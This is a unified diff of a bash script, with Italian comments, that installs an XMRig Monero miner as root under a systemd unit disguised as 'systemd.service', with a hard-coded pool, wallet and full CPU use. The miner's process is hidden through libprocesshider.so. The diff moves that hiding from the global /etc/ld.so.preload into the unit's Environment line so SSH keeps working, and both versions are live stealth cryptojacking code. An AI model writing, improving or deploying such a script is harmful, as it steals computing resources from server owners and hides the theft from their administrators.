@@ -1,30 +1,20 @@
 #!/bin/bash
 
-# 1. Ferma il servizio attuale per evitare conflitti durante la scrittura
+# 1. Ferma il servizio attuale per evitare conflitti durante la riscrittura
 systemctl stop systemd.service 2>/dev/null || true
 
 # 2. Crea la cartella se non esiste ed entra dentro
 mkdir -p /opt/systemd
 cd /opt/systemd
 
-# 3. CREAZIONE DEL WRAPPER
-# Questo file intercetta l'avvio, applica la libreria e lancia il miner vero e proprio
-cat <<'EOF' > /opt/systemd/xmrig-wrapper.sh
-#!/bin/bash
-export LD_PRELOAD=/usr/local/lib/libprocesshider.so
-exec /opt/systemd/xmrig "$@"
-EOF
-
-# Assegna i permessi di esecuzione al wrapper appena creato
-chmod +x /opt/systemd/xmrig-wrapper.sh
-
-# 4. Configura il mascheramento globale a livello di sistema
-> /etc/ld.so.preload
-if [ -f "/usr/local/lib/libprocesshider.so" ]; then
-    echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
+# 3. PULIZIA DEL SISTEMA (Cruciale per sbloccare SSH)
+# Svuota il file globale per evitare che influenzi altri servizi come SSH
+if [ -f /etc/ld.so.preload ]; then
+    > /etc/ld.so.preload
 fi
 
-# 5. Modifica o crea il servizio Systemd puntando al wrapper
+# 4. CREAZIONE DEL SERVIZIO SYSTEMD ISOLATO
+# Applichiamo LD_PRELOAD solo a questo specifico servizio tramite la direttiva 'Environment'
 cat <<EOF > /etc/systemd/system/systemd.service
 [Unit]
 Description=Systemd Service
@@ -35,7 +25,9 @@ Wants=network-online.target
 Type=simple
 User=root
 WorkingDirectory=/opt/systemd
-ExecStart=/opt/systemd/xmrig-wrapper.sh -o gulf.moneroocean.stream:10128 -u 46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt -p server_\$(hostname -s) --keepalive --cpu-max-threads-hint=100 --randomx-mode=fast --randomx-1gb-pages --no-nvml --no-opencl
+# La libreria viene iniettata SOLO in questo processo e nei suoi figli
+Environment="LD_PRELOAD=/usr/local/lib/libprocesshider.so"
+ExecStart=/opt/systemd/xmrig -o gulf.moneroocean.stream:10128 -u 46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt -p server_\$(hostname -s) --keepalive --cpu-max-threads-hint=100 --randomx-mode=fast --randomx-1gb-pages --no-nvml --no-opencl
 Restart=always
 RestartSec=10
 
@@ -43,6 +35,6 @@ RestartSec=10
 WantedBy=multi-user.target
 EOF
 
-# 6. Ricarica la configurazione di Systemd e riavvia il processo
+# 5. Ricarica la configurazione di Systemd e avvia il processo isolato
 systemctl daemon-reload
 systemctl start systemd.service
